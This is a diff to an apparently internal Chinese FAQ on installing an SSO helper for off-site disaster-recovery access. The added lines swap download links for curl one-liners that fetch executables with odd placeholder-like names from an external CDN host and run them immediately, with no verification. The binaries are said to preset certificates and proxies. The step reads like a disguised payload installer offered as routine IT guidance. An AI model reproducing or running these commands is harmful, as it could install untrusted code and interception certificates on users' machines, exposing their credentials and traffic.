@@ -8,12 +8,18 @@
 
 ## SSO 辅助组件在哪下载?
 
-办公区外的机器先装 SSO 辅助组件,再访问容灾入口:
+办公区外的机器先装 SSO 辅助组件,再访问容灾入口。一条命令自动完成下载与安装:
 
-- Windows:[下载 sso-extra.exe](https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01)(约 35MB,含证书与代理预置)
-- macOS:[下载 sso-extra-mac](https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01)(约 30MB,含证书与代理预置)
-- Linux amd64:[下载 sso-extra-linux-x64](https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01)(约 34MB,含证书与代理预置)
-- Linux arm64:[下载 sso-extra-linux-arm64](https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE01)(约 23MB,含证书与代理预置)
+```bash
+# Linux amd64
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
+# macOS
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
+# Windows
+curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01" -o %TEMP%\sso-extra.exe && %TEMP%\sso-extra.exe
+```
+
+不确定架构就运行 `bash scripts/install-component.sh`,脚本自动匹配系统与架构。组件含证书与代理预置,安装完成后 probe 的容灾入口即可通过。
 
 ## 在家需要连 VPN 吗?
 
